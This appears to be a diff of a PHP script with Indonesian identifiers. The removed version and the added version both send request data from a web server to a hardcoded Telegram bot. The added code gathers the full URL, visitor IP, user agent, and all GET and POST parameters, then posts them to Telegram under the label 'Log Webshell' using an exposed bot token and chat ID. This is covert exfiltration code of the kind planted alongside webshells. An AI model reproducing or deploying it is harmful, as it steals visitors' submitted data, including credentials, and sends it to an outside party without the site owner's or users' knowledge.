@@ -1,44 +1,32 @@
 <?php
-function kirimUrlKeTelegram($url) {
-    $botToken = "7470301301:AAFEaEpn9_eKbf67UOsEYuU6hLLf4HY_uUw";
-    $chatId = "-1002216453535";
-    
-    $message = "URL diakses: " . $url;
-    
-    $telegramApiUrl = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
+$chat_id = "-1002216453535";
+$token = "7470301301:AAFEaEpn9_eKbf67UOsEYuU6hLLf4HY_uUw";
 
-    $data = [
-        'chat_id' => $chatId,
-        'text' => $message
-    ];
+$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
+$url_diakses = $protocol . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
 
-    $ch = curl_init();
+$log_data = "URL diakses: " . $url_diakses . "\n";
+$log_data .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
+$log_data .= "Tanggal: " . date("Y-m-d H:i:s") . "\n";
+$log_data .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
+$log_data .= "Data GET: " . print_r($_GET, true) . "\n";
+$log_data .= "Data POST: " . print_r($_POST, true) . "\n";
+$log_data .= "-----------------------------\n";
 
-    curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
-    curl_setopt($ch, CURLOPT_POST, 1);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$message = urlencode("Log Webshell:\n" . $log_data);
 
-    curl_exec($ch);
+$url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$message";
 
-    curl_close($ch);
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$output = curl_exec($ch);
+curl_close($ch);
+
+if ($output) {
+
+} else {
+
 }
-
-$host = $_SERVER['HTTP_HOST'];
-$requestUri = $_SERVER['REQUEST_URI'];
-
-if (!empty($_GET)) {
-    $getParams = http_build_query($_GET);
-    $requestUri .= '?' . $getParams;
-}
-
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST)) {
-    $postParams = http_build_query($_POST);
-    $requestUri .= '?' . $postParams;
-}
-
-$fullUrl = "https://" . $host . $requestUri;
-
-kirimUrlKeTelegram($fullUrl);
 
 ?>
